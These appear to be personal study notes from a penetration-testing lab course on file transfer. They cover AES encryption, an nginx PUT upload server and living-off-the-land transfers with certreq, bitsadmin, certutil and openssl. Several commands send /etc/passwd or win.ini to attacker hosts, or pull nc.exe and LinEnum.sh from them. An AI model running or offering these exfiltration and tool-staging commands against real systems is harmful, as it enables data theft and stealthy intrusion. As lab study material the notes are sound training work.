- [ ] Protected File Transfer
![[Pasted image 20250609091148.png]]
File Encryption!!!!
```sh
# Windows
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

# linux
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```
- [ ] Catching Files Over HTTPS
Nginx Configuration!!!!
```sh
mkdir -p /var/www/uploads/SecretUploadDirectory
chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
# /etc/nginx/sites-available/upload.conf
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
# Symlink our Site to the sites-enabled Directory
ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
systemctl restart nginx.service
# chek everything work fine
tail -2 /var/log/nginx/error.log
ss -lnpt | grep 80
ps -ef | grep PID
# remove default nginx conf
rm /etc/nginx/sites-enabled/default
# Upload files
curl -T /etc/passwd http://IP:9001/SecretUploadDirectory/users.txt
```
- [ ] Living off  the Land
![[Pasted image 20250609092004.png]]
Windows!!!!
```powershell
# certreq
certreq.exe -Post -config http://10.10.14.204:8080/ c:\windows\win.ini
nc -lvnp 8000
# Bitsadmin
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
# Certutil
certutil.exe -verifyctl -split -f http://10.10.14.204:8080/nc.exe
```
Linux!!!
```sh
# openssh
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
# attacker
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
